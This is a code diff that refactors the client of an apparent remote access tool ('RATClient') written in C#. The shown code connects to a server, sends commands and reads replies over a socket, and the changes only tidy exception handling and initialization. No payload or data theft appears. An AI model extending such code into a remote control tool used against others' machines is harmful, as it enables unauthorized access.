@@ -104,10 +104,7 @@ namespace RATClient
                     serverID = ip.ToString() + ":" + port.ToString();
                     Console.WriteLine("Client: Connected To: " + ip.ToString() + ":" + port.ToString() + ".");
                 }
-                catch
-                {
-                    Console.WriteLine("Error: The Server Is Unreachable.");
-                }
+                catch { Console.WriteLine("Error: The Server Is Unreachable."); }
             } else
             {
                 Console.WriteLine("Already Connected - Disconnect First.");
@@ -117,8 +114,7 @@ namespace RATClient
         {
             try
             {
-                Command c = new Command();
-                c.CMD = CMDS[0];
+                Command c = new Command { CMD = CMDS[0] };
                 int argcount = CMDS.Length - 1;
                 if (argcount != 0)
                 {
@@ -135,7 +131,7 @@ namespace RATClient
                 int bytesRead = 0;
                 do
                 {
-                    bytesRead = nstream.Read(message, 0, Convert.ToInt32(sock.ReceiveBufferSize));
+                    bytesRead = nstream.Read(message, 0, sock.ReceiveBufferSize);
                     sb.Append(Encoding.Unicode.GetString(message, 0, bytesRead));
                 } while (bytesRead == sock.ReceiveBufferSize);
                 if (sb.ToString() == string.Empty) return;
@@ -150,10 +146,7 @@ namespace RATClient
                     }
                     catch (Exception e) { Console.WriteLine(e.Message); }   
                 }
-            } catch (Exception e)
-            {
-                Console.WriteLine(e.Message);
-            }
+            } catch (Exception e) { Console.WriteLine(e.Message); }
         }
         #endregion
         #region "Helper Methods"
